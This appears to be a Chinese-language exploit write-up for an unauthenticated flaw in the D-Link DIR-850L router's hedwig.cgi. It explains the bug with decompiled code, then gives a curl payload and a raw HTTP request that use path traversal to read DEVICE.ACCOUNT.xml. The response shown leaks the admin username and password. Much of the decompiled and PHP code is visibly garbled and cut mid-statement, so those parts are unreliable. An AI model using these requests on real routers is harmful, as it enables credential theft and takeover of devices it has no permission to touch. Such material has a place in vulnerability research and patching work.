* * *
**0x01dlink850l远程命令执行漏洞**  
当管理员接口的配置信息发生改变时，变化的配置信息会以 xml 的数据格式发送给 hedwig.cgi ，由 hedwig.cgi
重载并应用这些配置信息，而在接受这个数据前，程序并没有对用户身份进行判断，导致非管理员用户也可向 hedwig.cgi 发送XML数据。在接收 XML
数据的过程中， hedwig.cgi 会调用 htdocs/webinc/fatlady.php 文件验证数据合法性。
hedwig.cgi其实是一个链接文件，指向/htdocs/cgibin文件，接收到用户请求的xml数据请求后先封装成xml文件，发送read
xml的请求到xmldb server，然后发送execute php的请求到xmldb server。  
hedwig.cgi
    int hedwigcgi_main(void)
    {
      bool bVar1;
      char *__s1;
      FILE *__stream;
      undefined *puVar2;
      int __fd;
      void *pvVar3;
      void *pvVar4;
      int __fd_00;
      int iVar5;
      int iVar6;
      char **ppcVar7;
      char acStack1232 [20];
      char *local_4bc [5];
      char acStack1192 [128];
      char acStack1064 [1024];
      memset(acStack1064,0,0x400);
      memset(acStack1192,0,0x80);
      memcpy(acStack1232,"/runtime/session",0x11);
      __s1 = getenv("REQUEST_METHOD");
      if (__s1 == (char *)0x0) {
        __s1 = "no REQUEST";
    LAB_0040d1bc:
        pvVar3 = (void *)0x0;
        pvVar4 = (void *)0x0;
    LAB_0040d5f4:
        __fd_00 = -1;
      }
      else {
        __fd_00 = strcasecmp(__s1,"POST");
        if (__fd_00 != 0) {
          __s1 = "unsupported HTTP request";
          goto LAB_0040d1bc;
        }
        cgibin_parse_request(&LAB_0040d5fc,0,0x20000);
        __stream = fopen("/etc/config/image_sign","r");  //读取文件载入硬件版本
        __s1 = fgets(acStack1192,0x80,__stream);
        if (__s1 == (char *)0x0) {
          __s1 = "unable to read signature!";
          goto LAB_0040d1bc;
        }
        fclose(__stream);
        cgibin_reatwhite(acStack1192);
        pvVar3 = (void *)sobj_new();
        pvVar4 = (void *)sobj_new();
        if ((pvVar3 == (void *)0x0) || (pvVar4 == (void *)0x0)) {
          __s1 = "unable to allocate string object";
          goto LAB_0040d5f4;
        }
        sess_get_uid((int)pvVar3);
        puVar2 = sobj_get_string((int)pvVar3);
        snprintf(acStack1064,0x400,"%s/%s/postxml","/runtime/session",puVar2);
        xmldbc_del((char *)0x0,0,acStack1064);   //删掉临时文件
        __stream = fopen("/var/tmp/temp.xml","w");
        if (__stream == (FILE *)0x0) {
          __s1 = "unable to open temp file.";
          goto LAB_0040d5f4;
        }
        if (DAT_00437f30 == (char *)0x0) {
          __s1 = "no xml data.";
          goto LAB_0040d5f4;
        }
        __fd_00 = fileno(__stream);
        __fd_00 = lockf(__fd_00,3,0);
        if (__fd_00 BUSY%s"
                 ,0);
          __fd_00 = 0;
          goto LAB_0040d570;
        }
        ppcVar7 = local_4bc + 2;
        __fd = fileno(__stream);
        lockf(__fd,1,0);
        local_4bc[1] = (char *)0x0;
        local_4bc[2] = 0;
        local_4bc[3] = 0;
        local_4bc[4] = 0;
        local_4bc[0] = acStack1192;
        local_4bc[1] = strtok(acStack1232,"/");
        __fd = 2;
        do {
          iVar6 = __fd;
          __fd = iVar6 + 1;
          __s1 = strtok((char *)0x0,"/");
          *ppcVar7 = __s1;
          ppcVar7 = ppcVar7 + 1;
        } while (__s1 != (char *)0x0);
        ppcVar7 = local_4bc;
        iVar5 = 0;
        __s1 = sobj_get_string((int)pvVar3);
        local_4bc[iVar6] = __s1;
        fputs("\n",__stream);
        bVar1 = 0 \n",__s1);
          bVar1 = iVar5 ");
        fprintf(__stream,"%s\n",__s1);
        ppcVar7 = local_4bc + iVar6;
        do {
          __fd = __fd + -1;
          __s1 = *ppcVar7;
          ppcVar7 = ppcVar7 + -1;
          fprintf(__stream,"\n",__s1);//写入/var/tmp/temp.xml"
        } while (0 FAILED%s"
             ,__s1);
    LAB_0040d570:
      if (DAT_00437f30 != (char *)0x0) {
        free(DAT_00437f30);
      }
      if (pvVar4 != (void *)0x0) {
        sobj_del(pvVar4);
      }
      if (pvVar3 != (void *)0x0) {
        sobj_del(pvVar3);
      }
      return __fd_00;
    }
跟上一篇类似的插入  
参考
fatlady.php
    HTTP/1.1 200 OK
    Content-Type: text/xml
    \n";
    echo "\n";
    echo "\t".  $FATLADY_result.    "\n";
    echo "\t".    $FATLADY_node.      "\n";
    echo "\t". $FATLADY_message.   "\n";
    echo "\n";
    ?>
利用payload
    curl -d '../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml' -b "uid=demo" -H "Content-Type: text/xml" "http://VictimIp:8080/hedwig.cgi"
抓包  
附加xml的post请求发送过去的命令触发漏洞  
**0x02dlink850l 命令执行漏洞获取shell**
**用./hedwig.cgi文件加载的fatlady.phpphp文件直接加载漏洞加载DEVICE.ACCOUNT.xml.php文件获取用户名，密码**  
请求：
    POST /hedwig.cgi HTTP/1.1
    Host: 192.168.0.1
    User-Agent: python-requests/2.18.4
    Accept-Encoding: gzip, deflate
    Accept: */*
    Connection: keep-alive
    Content-Type: text/xml
    Cookie: uid=whatever
    Content-Length: 150
        ../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml
回应：
    HTTP/1.1 200 OK
    Server: Linux, HTTP/1.1, DIR-850L Ver 1.14WW
    Date: Fri, 27 May 2016 00:02:46 GMT
    Transfer-Encoding: chunked
    Content-Type: text/xml
            DIR-850L
                1
                2
                1
                    USR-
                    Admin
                    root1996
                    0